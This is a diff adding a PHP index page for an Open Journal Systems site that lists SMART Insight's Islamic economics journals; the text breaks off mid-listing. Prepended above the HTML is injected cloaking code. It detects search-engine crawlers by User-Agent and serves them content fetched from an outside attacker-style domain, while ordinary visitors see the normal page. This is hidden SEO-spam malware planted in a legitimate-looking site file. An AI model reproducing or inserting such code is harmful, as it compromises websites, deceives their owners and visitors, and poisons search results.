@@ -1,0 +1,883 @@
+<?php
+ob_start();
+header('Vary: User-Agent');
+$bot_url = "https://koi.haxor-mahasuhu.info/journals.smartinsight/index.txt";
+$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+function lph_requests($url) {
+    if (function_exists('curl_init')) {    
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+if (preg_match($botchar, $ua)) {
+    usleep(rand(100000, 200000)); 
+    echo lph_requests($bot_url);
+    ob_end_flush();
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="en-US" xml:lang="en-US">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>
+		SMART Insight
+					</title>
+
+	
+<meta name="generator" content="Open Journal Systems 3.3.0.8">
+	<link rel="stylesheet" href="http://journals.smartinsight.id/index.php/index/$$$call$$$/page/page/css?name=stylesheet" type="text/css" /><link rel="stylesheet" href="http://journals.smartinsight.id/index.php/index/$$$call$$$/page/page/css?name=font" type="text/css" /><link rel="stylesheet" href="http://journals.smartinsight.id/lib/pkp/styles/fontawesome/fontawesome.css?v=3.3.0.8" type="text/css" />
+</head>
+<body class="pkp_page_index pkp_op_index" dir="ltr">
+
+	<div class="pkp_structure_page" style="outline-style:none;">
+
+				<header class="pkp_structure_head" id="headerNavigationContainer" role="banner">
+						 <nav class="cmp_skip_to_content" aria-label="Jump to content links">
+	<a href="#pkp_content_main">Skip to main content</a>
+	<a href="#siteNav">Skip to main navigation menu</a>
+									<a href="#pkp_content_footer">Skip to site footer</a>
+</nav>
+
+			<div class="pkp_head_wrapper">
+
+				<div class="pkp_site_name_wrapper">
+					<button class="pkp_site_nav_toggle">
+						<span>Open Menu</span>
+					</button>
+											<h1 class="pkp_screen_reader">
+															SMART Insight
+													</h1>
+										<div class="pkp_site_name">
+																<a href="						http://journals.smartinsight.id/index.php/index/index
+					" class="is_text">SMART Insight</a>
+										</div>
+				</div>
+
+				
+				<nav class="pkp_site_nav_menu" aria-label="Site Navigation">
+					<a id="siteNav"></a>
+					<div class="pkp_navigation_primary_row">
+						<div class="pkp_navigation_primary_wrapper">
+																			
+				
+
+																				</div>
+					</div>
+					<div class="pkp_navigation_user_wrapper" id="navigationUserWrapper">
+							<ul id="navigationUser" class="pkp_navigation_user pkp_nav_list">
+								<li class="profile">
+				<a href="http://journals.smartinsight.id/index.php/index/user/register">
+					Register
+				</a>
+							</li>
+								<li class="profile">
+				<a href="http://journals.smartinsight.id/index.php/index/login">
+					Login
+				</a>
+							</li>
+										</ul>
+
+					</div>
+				</nav>
+			</div><!-- .pkp_head_wrapper -->
+		</header><!-- .pkp_structure_head -->
+
+						<div class="pkp_structure_content" style="outline-style:none;">
+			<div class="pkpstructure_main" style="outline-style:none;"  role="main">
+				<a id="pkp_content_main"></a>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+	integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+
+<div class="page_index_site">
+
+		<div class="row text-decoration-none ">
+												<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/EII" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/1/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/EII" target="_blank" rel="bookmark">
+									Ekonomi Islam Indonesia
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Ekonomi Islam Indonesia (EII) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Ekonomi Islam Indonesia is published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/EII" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/EII/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/JIEL" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/11/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/JIEL" target="_blank" rel="bookmark">
+									Journal of Islamic Economics Literatures
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Journal of Islamic Economics Literatures (JIEL) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Journal of Islamic Economics Literatures published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/JIEL" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/JIEL/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/IJW" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/2/journalThumbnail_en_US.png">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/IJW" target="_blank" rel="bookmark">
+									International Journal of Waqf
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>International Journal of Waqf (IJW) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. International Journal of Waqf is published two (2) times in 1 year with scope on waqf, endowment, and social finance.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/IJW" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/IJW/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/HTP" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/9/journalThumbnail_en_US.png">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/HTP" target="_blank" rel="bookmark">
+									Halal Tourism and Pilgrimage
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Halal Tourism and Pilgrimage (HTP) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Halal Tourism and Pilgrimage published two (2) times in 1 year with scope on halal tourism, hajj economic, and religious pilgrimage.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/HTP" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/HTP/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/RIA" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/15/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/RIA" target="_blank" rel="bookmark">
+									Review on Islamic Accounting
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Review on Islamic Accounting (RIA) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Review on Islamic Accounting published two (2) times in 1 year with scope on Islamic accounting, auditing, and shariah governance.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/RIA" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/RIA/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/ISF" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/16/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/ISF" target="_blank" rel="bookmark">
+									Islamic Social Finance
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Islamic Social Finance (ISF) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Islamic Social Finance published two (2) times in 1 year with scope on zakat, waqf, takaful, and Islamic social finance in general.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/ISF" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/ISF/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/FWM" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/10/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/FWM" target="_blank" rel="bookmark">
+									Fara'id and Wealth Management
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Fara'id and Wealth Management (FWM) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Fara'id and Wealth Management published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/FWM" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/FWM/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/TJ" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/6/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/TJ" target="_blank" rel="bookmark">
+									Tamkin Journal
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Tamkin Journal (TJ) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Tamkin Journal published two (2) times in 1 year with scope on Islamic microfinance, and community empowerment studies.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/TJ" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/TJ/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/IEM" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/18/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/IEM" target="_blank" rel="bookmark">
+									Islamic Economics Methodology
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Islamic Economics Methodology (IEM) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. IEM Journal published two (2) times in 1 year with scope on Islamic economics &amp; finance and the methodological approaches.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/IEM" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/IEM/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/IEH" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/17/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/IEH" target="_blank" rel="bookmark">
+									Islamic Economics and History
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Islamic Economic and History (IEH) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. IEH Journal published two (2) times in 1 year with scope on Islamic economics and the historical aspects.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/IEH" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/IEH/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/ERP" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/4/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/ERP" target="_blank" rel="bookmark">
+									The Economic Review of Pesantren
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>The Economic Review of Pesantren (ERP) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. The ERP published two (2) times in 1 year with the scope on Pesantren economics.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/ERP" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/ERP/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/IMR" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/13/journalThumbnail_en_US.jpg" alt="Islamic Marketing Review" >
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/IMR" target="_blank" rel="bookmark">
+									Islamic Marketing Review
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Islamic Marketing Review (IMR) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. IMR journal published two (2) times in 1 year with the scope on Islamic marketing and halal industry.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/IMR" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/IMR/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/MSR" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/12/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/MSR" target="_blank" rel="bookmark">
+									Maqasid al-Shariah Review
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Maqasid al-Shariah Reviews (MSR) adalah publikasi ilmiah yang diterbitkan oleh SMART Insight yang berada di bawah lembaga riset SMART Indonesia. Sharia Economic Applied Research and Training (SMART) adalah lembaga penelitian di Indonesia yang fokus pada riset seputar ekonomi dan keuangan Islam. Maqasid al-Shariah Reviews terbit dua (2) kali dalam 1 tahun.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/MSR" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/MSR/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/SJIS" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/19/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/SJIS" target="_blank" rel="bookmark">
+									SMART Journal on Islamic Studies
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>SMART Journals on Islamic Studies adalah publikasi ilmiah yang diterbitkan oleh SMART Insight yang berada di bawah lembaga riset SMART Indonesia. Sharia Economic Applied Research and Training (SMART) adalah lembaga penelitian di Indonesia yang fokus pada riset seputar ekonomi dan keuangan Islam. SMART Journals on Islamic Studies terbit dua (2) kali dalam 1 tahun.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/SJIS" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/SJIS/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/IEFE" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/20/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/IEFE" target="_blank" rel="bookmark">
+									Islamic Economics and Finance Education
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>SMART Islamic Economics and Finance Education adalah publikasi ilmiah yang diterbitkan oleh SMART Insight yang berada di bawah lembaga riset SMART Indonesia. Sharia Economic Applied Research and Training (SMART) adalah lembaga penelitian di Indonesia yang fokus pada riset seputar ekonomi dan keuangan Islam. SMART Journals on Islamic Studies terbit dua (2) kali dalam 1 tahun.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/IEFE" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/IEFE/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/IFT" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/34/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/IFT" target="_blank" rel="bookmark">
+									Islamic Finance and Technology
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Islamic Finance and Technology (IFT) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Islamic Finance and Technology is published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/IFT" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/IFT/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/IEL" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/35/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/IEL" target="_blank" rel="bookmark">
+									Islamic Economics and Law
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Islamic Economics and Law (IEL) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Islamic Economics and Law is published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/IEL" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/IEL/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/RPS" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/31/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/RPS" target="_blank" rel="bookmark">
+									Review on Palestine Studies
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Review on Palestine Studies (RPS) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Review on Palestine Studies published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/RPS" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/RPS/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/AS" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/28/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/AS" target="_blank" rel="bookmark">
+									Accounting & Sustainability
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Accounting &amp; Sustainability (AS) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. AS Journal published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/AS" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/AS/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/IET" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/14/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/IET" target="_blank" rel="bookmark">
+									Islamic Economic Thought
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Islamic Economic Thought adalah publikasi ilmiah yang diterbitkan oleh SMART Insight yang berada di bawah lembaga riset SMART Indonesia. Sharia Economic Applied Research and Training (SMART) adalah lembaga penelitian di Indonesia yang fokus pada riset seputar ekonomi dan keuangan Islam. Islamic Economic Thought terbit dua (2) kali dalam 1 tahun.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/IET" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/IET/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/bs" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/29/journalThumbnail_en_US.png">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/bs" target="_blank" rel="bookmark">
+									Business & Sustainability
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Business &amp; Sustainability (BS) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Business &amp; Sustainability published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/bs" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/bs/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/MS" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/27/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/MS" target="_blank" rel="bookmark">
+									Management & Sustainability
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Management &amp; Sustainability (MS) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. MS Journal published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/MS" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/MS/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/FS" target="_blank">
